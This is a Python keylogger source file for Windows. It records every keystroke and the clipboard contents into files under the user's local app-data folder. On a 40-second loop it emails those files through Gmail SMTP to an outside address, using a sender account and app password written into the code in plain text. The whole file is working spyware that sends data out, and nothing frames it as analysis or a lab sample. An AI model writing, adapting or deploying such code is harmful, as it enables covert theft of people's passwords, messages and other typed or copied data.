from pynput.keyboard import Key,Listener
import os
import win32clipboard
import time
import smtplib


file_path=(os.getenv('LOCALAPPDATA'))
time_iter=40
no_of_iter=0
no_of_iter_end=3
currenttime=time.time()
stoppingtime=time.time()+time_iter

def sendmail(loc):
    email = "arnavnamdeo2@gmail.com"
    reciever_email = "f20240995@goa.bits-pilani.ac.in"  

    subject = print("keylog")
    with open(file_path+"//"+loc,'r') as f:
        global message
        message = f.read()

    text = f"SUbject: {subject}\n\n{message}"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    server.login(email, "mtvejapttakcoicm")
    server.sendmail(email,reciever_email, text)

    print ("email has been sent to" + reciever_email)

def copyclipboard():
    try:
        with open(file_path+"//"+"clipboard.txt",'a')  as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data=win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("clipboard data: \n"+pasted_data)
            except:
                pass
    except:
        with open(file_path+"//"+"clipboard.txt",'w')  as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data=win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("clipboard data: \n"+pasted_data)
            except:
                pass

while True:
    count = 0
    keys=[]
    def on_press(key):
        global keys,count,currenttime
        currenttime=time.time()
        keys.append(key)
        count+=1
        if count>=1:
            count=0
            write_file(keys)
            keys=[]
    def write_file(keys):
        try:
            with open(file_path+"//"+"log.txt",'a')  as f:
                for key in keys:
                    k=str(key).replace("'","") 
                    f.write(k) 
        except:
            with open(file_path+"//"+"log.txt",'w')  as f:
                for key in keys:
                    k=str(key).replace("'","")
                    f.write(k)
    def on_release(key):
        if currenttime>stoppingtime:
            return False
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    if currenttime>stoppingtime:
        copyclipboard()
        sendmail("log.txt")
        sendmail("clipboard.txt")
        no_of_iter+=1
        currenttime=time.time()
        stoppingtime=time.time()+time_iter

